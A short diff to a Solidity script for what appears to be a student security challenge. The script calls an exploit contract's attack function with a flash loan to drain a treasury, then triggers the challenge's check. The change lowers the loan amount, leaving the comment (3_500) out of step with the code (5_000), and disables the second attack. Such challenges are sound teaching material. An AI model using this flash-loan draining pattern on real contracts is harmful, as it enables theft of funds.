@@ -34,12 +34,12 @@ contract Challenge3Script is Script {
         );
 
         // 2. Execute the attack twice to drain the treasury
-        // 2-1. Using the 10_000 tokenA flash loan
-        uint256 flashLoanAmount = 10_000 * 1e18;
+        // 2-1. Using the 3_500 tokenA flash loan
+        uint256 flashLoanAmount = 5_000 * 1e18;
         exploit.attack(tokenA, flashLoanAmount);
         
-        // 2-2. Using the 10_000 tokenB flash loan
-        exploit.attack(tokenB, flashLoanAmount);
+        // 2-2. Using the 3_500 tokenB flash loan
+        // exploit.attack(tokenB, flashLoanAmount);
 
         // 3. Trigger the verification on the ChallengeFactory
         IChallengeFactory(challengeFactory).check3(studentId);
